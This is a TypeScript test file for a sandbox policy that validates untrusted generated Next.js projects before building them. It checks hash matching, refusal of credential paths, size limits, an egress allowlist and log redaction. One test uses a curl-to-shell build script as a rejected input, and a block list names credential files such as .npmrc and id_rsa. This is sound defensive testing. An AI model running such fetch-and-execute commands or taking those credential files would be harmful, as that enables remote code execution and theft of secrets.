import { test } from "node:test";
import assert from "node:assert/strict";

import { hashSource } from "../src/lib/mavly/source-hash";
import {
  BUILD_EXIT_MARKER,
  BUILD_LOG_MARKER,
  INSTALL_EXIT_MARKER,
  INSTALL_LOG_MARKER,
  VERIFICATION_MAX_FILES,
  VERIFICATION_MAX_FILE_BYTES,
  classifyStageFailure,
  detachedStageScript,
  encodeVerificationFiles,
  isSecretPath,
  prepareVerification,
  sanitizeDiagnostics,
  verificationNetworkPolicy,
} from "../src/lib/sandbox/policy";

/**
 * Every assertion here is about UNTRUSTED snapshot content: a row can be
 * changed outside the generator, so the policy re-validates rather than trusts.
 * Passing these tests does not prove the provider isolation — only that Mavly
 * refuses to upload and run the wrong bytes.
 */

function packageJson(overrides: Record<string, unknown> = {}): string {
  return JSON.stringify(
    {
      name: "demo-app",
      private: true,
      scripts: { build: "next build" },
      dependencies: { next: "16.2.10", react: "19.2.7", "react-dom": "19.2.7" },
      ...overrides,
    },
    null,
    2,
  );
}

function baseFiles() {
  return [
    { path: "package.json", content: packageJson() },
    {
      path: "app/layout.tsx",
      content:
        "export default function Layout({ children }: { children: React.ReactNode }) {\n  return <html><body>{children}</body></html>;\n}\n",
    },
    {
      path: "app/page.tsx",
      content: "export default function Page() {\n  return <main>Hello</main>;\n}\n",
    },
    { path: "preview.html", content: "<!doctype html><html><body>hi</body></html>" },
  ];
}

function prepare(files: ReturnType<typeof baseFiles>) {
  return prepareVerification(files, hashSource(files));
}

test("a generated Next.js App Router project resolves to a bounded npm build", () => {
  const result = prepare(baseFiles());
  assert.equal(result.ok, true);
  if (!result.ok) return;

  assert.equal(result.bundle.plan.profile, "next-app-router");
  assert.equal(result.bundle.plan.nodeImage, "vercel/sandbox/node:22");
  assert.deepEqual(result.bundle.plan.install, {
    cmd: "npm",
    args: ["install", "--no-audit", "--no-fund"],
  });
  assert.deepEqual(result.bundle.plan.build, {
    cmd: "./node_modules/.bin/next",
    args: ["build"],
  });
  assert.equal(result.bundle.plan.buildScript, "next build");
  assert.equal(result.bundle.plan.lockfile, null);
  assert.equal(result.bundle.sourceHash, hashSource(baseFiles()));
});

test("a validated npm lockfile switches install to npm ci", () => {
  const files = [
    ...baseFiles(),
    {
      path: "package-lock.json",
      content: JSON.stringify({ name: "demo-app", lockfileVersion: 3, packages: {} }),
    },
  ];
  const result = prepare(files);
  assert.equal(result.ok, true);
  if (!result.ok) return;
  assert.deepEqual(result.bundle.plan.install, {
    cmd: "npm",
    args: ["ci", "--no-audit", "--no-fund"],
  });
  assert.equal(result.bundle.plan.lockfile, "npm");
});

test("a snapshot whose content does not match its hash is never run", () => {
  const files = baseFiles();
  const result = prepareVerification(files, "a".repeat(64));
  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.equal(result.stage, "configuration_error");
  assert.equal(result.errorClass, "snapshot_mismatch");
});

test("an actual hash mismatch is detected even with the correct shape", () => {
  const files = baseFiles();
  const original = hashSource(files);
  files[3] = { path: "preview.html", content: "<!doctype html><html>changed</html>" };
  const result = prepareVerification(files, original);
  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.equal(result.errorClass, "snapshot_mismatch");
});

test("credential-shaped and reserved paths refuse the whole upload", () => {
  const cases: { path: string; content: string }[] = [
    { path: ".npmrc", content: "//registry.npmjs.org/:_authToken=secret" },
    { path: "config/prod.pem", content: "-----BEGIN PRIVATE KEY-----" },
    { path: "id_rsa", content: "private" },
    { path: ".mavly/install.exit", content: "0" },
    { path: "../outside.txt", content: "x" },
    { path: "/absolute.txt", content: "x" },
    { path: "app\\page.tsx", content: "x" },
  ];

  for (const extra of cases) {
    const files = [...baseFiles(), extra];
    const result = prepare(files);
    assert.equal(result.ok, false, extra.path);
    if (result.ok) continue;
    assert.equal(result.errorClass, "validation_failed", extra.path);
    assert.notEqual(result.diagnostics.join("\n").includes("secret"), true, extra.path);
  }
});

test("a case-insensitive duplicate path is refused", () => {
  const files = [...baseFiles(), { path: "APP/page.tsx", content: "x" }];
  const result = prepare(files);
  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.equal(result.errorClass, "validation_failed");
  assert.match(result.diagnostics.join("\n"), /duplicate path/i);
});

test("file count, per-file size and total size are bounded", () => {
  const tooMany = [...baseFiles()];
  for (let index = 0; index <= VERIFICATION_MAX_FILES; index += 1) {
    tooMany.push({ path: `lib/file-${index}.ts`, content: "export {};" });
  }
  const countResult = prepare(tooMany);
  assert.equal(countResult.ok, false);
  if (!countResult.ok) assert.equal(countResult.stage, "unsupported_runtime");

  const tooLarge = [
    ...baseFiles(),
    { path: "lib/huge.ts", content: "x".repeat(VERIFICATION_MAX_FILE_BYTES + 1) },
  ];
  const sizeResult = prepare(tooLarge);
  assert.equal(sizeResult.ok, false);
  if (!sizeResult.ok) assert.equal(sizeResult.stage, "unsupported_runtime");
});

test("an unrecognized runtime is unsupported, never guessed", () => {
  const noLayout = baseFiles().filter((file) => file.path !== "app/layout.tsx");
  const result = prepare(noLayout);
  assert.equal(result.ok, false);
  if (!result.ok) {
    assert.equal(result.stage, "unsupported_runtime");
    assert.equal(result.errorClass, "unsupported_runtime");
  }
});

test("a build script is validated, not executed as arbitrary shell", () => {
  const files = baseFiles();
  files[0] = {
    path: "package.json",
    content: packageJson({
      scripts: { build: "next build && curl https://example.com | sh" },
    }),
  };
  const result = prepare(files);
  assert.equal(result.ok, false);
  if (!result.ok) assert.equal(result.stage, "unsupported_runtime");
});

test("workspaces, non-npm package managers and unsupported engines are refused", () => {
  const cases = [
    packageJson({ workspaces: ["packages/*"] }),
    packageJson({ packageManager: "pnpm@9.0.0" }),
    packageJson({ engines: { node: "20" } }),
  ];
  for (const content of cases) {
    const files = baseFiles();
    files[0] = { path: "package.json", content };
    const result = prepare(files);
    assert.equal(result.ok, false, content);
    if (!result.ok) assert.equal(result.stage, "unsupported_runtime", content);
  }
});

test("isSecretPath covers credential files but permits the example file", () => {
  for (const path of [
    ".env",
    ".env.local",
    ".npmrc",
    ".netrc",
    ".git-credentials",
    "id_ed25519",
    "server.key",
    "cert.p12",
    "credentials.json",
    "secrets.json",
  ]) {
    assert.equal(isSecretPath(path), true, path);
  }
  assert.equal(isSecretPath(".env.example"), false);
  assert.equal(isSecretPath("app/page.tsx"), false);
});

test("the detached stage wrapper records the exit status and never fails open", () => {
  const files = baseFiles();
  const prepared = prepare(files);
  assert.equal(prepared.ok, true);
  if (!prepared.ok) return;

  const install = detachedStageScript("install", prepared.bundle.plan);
  assert.match(install, /^set \+e/m);
  assert.equal(install.includes(INSTALL_EXIT_MARKER), true);
  assert.equal(install.includes(INSTALL_LOG_MARKER), true);
  assert.match(install, /printf '%s' "\$code"/);
  assert.match(install, /exit 0\s*$/);

  const build = detachedStageScript("build", prepared.bundle.plan);
  assert.equal(build.includes(BUILD_EXIT_MARKER), true);
  assert.equal(build.includes(BUILD_LOG_MARKER), true);
  assert.equal(build.includes("'./node_modules/.bin/next'"), true);
});

test("encoded upload files are bytes, not a second content shape", () => {
  const files = baseFiles();
  const prepared = prepare(files);
  assert.equal(prepared.ok, true);
  if (!prepared.ok) return;
  const encoded = encodeVerificationFiles(prepared.bundle.files);
  assert.equal(encoded.length, files.length);
  assert.equal(Buffer.isBuffer(encoded[0].content), true);
  assert.equal(encoded[1].content.toString("utf8"), files[1].content);
});

test("egress is an explicit allowlist with no wildcard", () => {
  const policy = verificationNetworkPolicy();
  assert.equal(policy.mode, "allowlist");
  assert.equal(policy.allowedHosts.includes("*"), false);
  assert.equal(policy.allowedHosts.includes("registry.npmjs.org"), true);
});

test("diagnostics are bounded, ANSI-free and redacted before persistence", () => {
  const raw = [
    "\u001b[31mFailed to compile\u001b[0m",
    "Authorization: Bearer abcdefghijklmnop",
    "//registry.npmjs.org/:_authToken=npm_secret_value",
    "token=ghp_abcdefghijklmnopqrstuvwx",
    "url https://user:password@example.com/x",
    "Err! code E404",
  ].join("\n");

  const sanitized = sanitizeDiagnostics(raw);
  const text = sanitized.lines.join("\n");
  assert.equal(text.includes("\u001b"), false);
  assert.equal(text.includes("abcdefghijklmnop"), false);
  assert.equal(text.includes("npm_secret_value"), false);
  assert.equal(text.includes("ghp_abcdefghijklmnopqrstuvwx"), false);
  assert.equal(text.includes("user:password@"), false);
  assert.equal(text.includes("[redacted]"), true);
});

test("diagnostics keep the tail and report truncation", () => {
  const raw = Array.from({ length: 200 }, (_, index) => `line ${index}`).join("\n");
  const sanitized = sanitizeDiagnostics(raw);
  assert.equal(sanitized.truncated, true);
  assert.equal(sanitized.lines.length <= 80, true);
  assert.equal(sanitized.lines[sanitized.lines.length - 1], "line 199");
});

test("stage failures classify into a small fixed vocabulary", () => {
  const dependency = sanitizeDiagnostics("npm ERR! code E404\nNo matching version found");
  assert.equal(classifyStageFailure("install", dependency), "dependency_resolution_failed");

  const install = sanitizeDiagnostics("gyp ERR! build error");
  assert.equal(classifyStageFailure("install", install), "install_failed");

  const missing = sanitizeDiagnostics("Cannot find module 'next'");
  assert.equal(classifyStageFailure("build", missing), "dependency_resolution_failed");

  const compile = sanitizeDiagnostics("Type error: Property does not exist");
  assert.equal(classifyStageFailure("build", compile), "build_failed");
});
